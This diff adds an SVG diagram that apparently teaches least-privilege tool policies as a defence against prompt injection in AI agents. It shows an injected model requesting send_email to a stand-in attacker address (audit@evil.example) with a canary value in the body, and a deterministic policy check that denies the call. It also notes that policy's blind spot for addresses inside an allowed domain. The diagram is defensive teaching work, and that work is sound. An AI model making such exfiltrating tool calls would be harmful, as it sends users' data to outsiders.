@@ -1,0 +1,30 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="780" height="258" viewBox="0 0 780 258" font-family="Helvetica Neue, Helvetica, Arial, sans-serif">
+<defs><marker id="arrow" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M 0 0 L 10 5 L 0 10 z" fill="#52514e"/></marker><marker id="arrow_red" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M 0 0 L 10 5 L 0 10 z" fill="#d23c3c"/></marker></defs>
+<rect width="780" height="258" fill="#fcfcfb"/>
+<text x="24" y="22" font-size="14" fill="#0b0b0b" text-anchor="start" font-weight="bold" dominant-baseline="middle" xml:space="preserve">Least privilege: deny the action, not the prompt</text>
+<rect x="24" y="60" width="210" height="92" rx="6" fill="#fde9e2" stroke="#eb6834" stroke-width="1.2"/>
+<text x="34" y="76" font-size="11.5" fill="#0b0b0b" text-anchor="start" font-weight="bold" dominant-baseline="middle" xml:space="preserve">the model, talked into it</text>
+<text x="34" y="94" font-size="10" fill="#52514e" text-anchor="start" font-weight="normal" dominant-baseline="middle" xml:space="preserve" font-family="Menlo, Consolas, monospace">asks for:</text>
+<text x="34" y="108" font-size="10" fill="#52514e" text-anchor="start" font-weight="normal" dominant-baseline="middle" xml:space="preserve" font-family="Menlo, Consolas, monospace">send_email(</text>
+<text x="34" y="122" font-size="10" fill="#52514e" text-anchor="start" font-weight="normal" dominant-baseline="middle" xml:space="preserve" font-family="Menlo, Consolas, monospace"> to="audit@evil.example",</text>
+<text x="34" y="136" font-size="10" fill="#52514e" text-anchor="start" font-weight="normal" dominant-baseline="middle" xml:space="preserve" font-family="Menlo, Consolas, monospace"> body="…NB-CANARY-7731")</text>
+<line x1="234" y1="106" x2="284" y2="106" stroke="#52514e" stroke-width="1.4" marker-end="url(#arrow)"/>
+<rect x="284" y="52" width="212" height="108" rx="6" fill="#e3eefb" stroke="#2a78d6" stroke-width="1.2"/>
+<text x="294" y="68" font-size="11.5" fill="#0b0b0b" text-anchor="start" font-weight="bold" dominant-baseline="middle" xml:space="preserve">policy_check(name, args, ctx)</text>
+<text x="294" y="86" font-size="10" fill="#52514e" text-anchor="start" font-weight="normal" dominant-baseline="middle" xml:space="preserve">reads only: the tool name,</text>
+<text x="294" y="100" font-size="10" fill="#52514e" text-anchor="start" font-weight="normal" dominant-baseline="middle" xml:space="preserve">the arguments, the role</text>
+<text x="294" y="114" font-size="10" fill="#52514e" text-anchor="start" font-weight="normal" dominant-baseline="middle" xml:space="preserve">never: the email, the prompt,</text>
+<text x="294" y="128" font-size="10" fill="#52514e" text-anchor="start" font-weight="normal" dominant-baseline="middle" xml:space="preserve">or why the model asked</text>
+<path d="M 496 92 C 520 92, 520 76, 544 76" fill="none" stroke="#52514e" stroke-width="1.3" marker-end="url(#arrow)"/>
+<path d="M 496 124 C 520 124, 520 140, 544 140" fill="none" stroke="#d23c3c" stroke-width="1.3" marker-end="url(#arrow_red)"/>
+<rect x="544" y="50" width="212" height="52" rx="6" fill="#dff5ec" stroke="#1baf7a" stroke-width="1.2"/>
+<text x="554" y="66" font-size="11.5" fill="#0b0b0b" text-anchor="start" font-weight="bold" dominant-baseline="middle" xml:space="preserve">allowed: the tool runs</text>
+<text x="554" y="84" font-size="10" fill="#52514e" text-anchor="start" font-weight="normal" dominant-baseline="middle" xml:space="preserve">e.g. to a @novabank.example address</text>
+<rect x="544" y="114" width="212" height="52" rx="6" fill="#fbe3e3" stroke="#d23c3c" stroke-width="1.2"/>
+<text x="554" y="130" font-size="11.5" fill="#0b0b0b" text-anchor="start" font-weight="bold" dominant-baseline="middle" xml:space="preserve">denied: the tool never runs</text>
+<text x="554" y="148" font-size="10" fill="#52514e" text-anchor="start" font-weight="normal" dominant-baseline="middle" xml:space="preserve">"Denied by policy: …" goes back</text>
+<rect x="24" y="190" width="732" height="57" rx="6" fill="#efeeea" stroke="#c3c2b7" stroke-width="1.2"/>
+<text x="34" y="204.5" font-size="10.5" fill="#52514e" text-anchor="start" font-weight="normal" dominant-baseline="middle" xml:space="preserve">The injection still worked: the model asked. The policy makes the asking harmless, whatever words did the persuading.</text>
+<text x="34" y="219.5" font-size="10.5" fill="#52514e" text-anchor="start" font-weight="normal" dominant-baseline="middle" xml:space="preserve">It is code, so it is deterministic: the same call gets the same answer every time, and no rephrasing changes it.</text>
+<text x="34" y="234.5" font-size="10.5" fill="#52514e" text-anchor="start" font-weight="normal" dominant-baseline="middle" xml:space="preserve">Its limit is what it checks: a rule on the recipient's domain does not stop a mail to an address inside that domain.</text>
+</svg>
